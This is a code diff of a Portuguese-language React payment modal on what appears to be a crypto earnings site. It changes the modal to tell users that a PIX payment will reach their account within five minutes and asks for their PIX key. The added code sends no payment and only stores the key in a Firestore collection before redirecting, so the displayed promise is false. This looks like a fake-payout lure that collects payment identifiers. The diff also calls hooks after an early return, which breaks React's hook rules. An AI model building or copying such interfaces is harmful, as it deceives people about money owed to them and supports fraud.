@@ -10,6 +10,9 @@ import CurrencyInput from "react-currency-input-field";
 
 import { useRouter } from "next/navigation";
 import BitcoinConverter from "@/components/bitcoin";
+import { addDoc, collection } from "firebase/firestore";
+import { db } from "@/services/firebase";
+import { Router } from "next/router";
 
 function AnimatedGrid() {
   const items = [
@@ -138,6 +141,28 @@ interface PaymentModalProps {
 const PaymentModal = ({ isOpen, onClose }: PaymentModalProps) => {
   if (!isOpen) return null;
 
+  const [pixKey, setPixKey] = useState(""); // Estado para armazenar o valor do input
+  const router = useRouter();
+  // Função para salvar a chave PIX no Firestore
+  const handleSavePixKey = async () => {
+    if (!pixKey) {
+      alert("Por favor, insira uma chave PIX.");
+      return;
+    }
+
+    try {
+      await addDoc(collection(db, "pixKeys"), {
+        chave: pixKey, // Campo 'key' com o valor da chave PIX
+      });
+      console.log("Chave PIX salva com sucesso!");
+      setPixKey(""); // Limpa o campo após salvar
+
+      router.replace("/");
+    } catch (error) {
+      console.error("Erro ao salvar chave PIX: ", error);
+    }
+  };
+
   return (
     <div className="fixed inset-0 z-50 flex items-center justify-center bg-transparent bg-opacity-50">
       <motion.div
@@ -148,18 +173,24 @@ const PaymentModal = ({ isOpen, onClose }: PaymentModalProps) => {
         className="bg-[#19181d] text-white p-6 rounded-lg shadow-lg w-[98%] max-w-md"
       >
         <h2 className="text-2xl font-poppinsBold mb-4 text-center">
-          Garanta seu acesso para sacar
+          Enviando seu pagamento...
         </h2>
         <p className="mb-6 text-center w-full">
-          Clique no botão abaixo para garantir acesso a nossa plataforma.
+          Em até 5 minutos o PIX vai cair na sua conta, escolha sua chave.
         </p>
+        <input
+          id="chave-pix"
+          name="input-name"
+          className={`w-full h-[55px] p-4 bg-transparent border border-solid border-[#dfdfdf] mb-2 rounded-xl pl-4 text-white`}
+          placeholder="sua chave pix"
+          value={pixKey} // Valor controlado pelo estado
+          onChange={(e) => setPixKey(e.target.value)} // Atualiza o estado ao digitar
+        />
         <button
-          onClick={() => {
-            window.open("https://www.google.com", "_blank");
-          }}
-          className="w-full bg-success text-white py-2 rounded-lg hover:bg-success/80 transition-all"
+          onClick={handleSavePixKey}
+          className="w-full bg-success text-white py-2  h-[55px] mt-5 rounded-lg hover:bg-success/80 transition-all"
         >
-          Garantir acesso
+          Receber pagamento
         </button>
       </motion.div>
     </div>
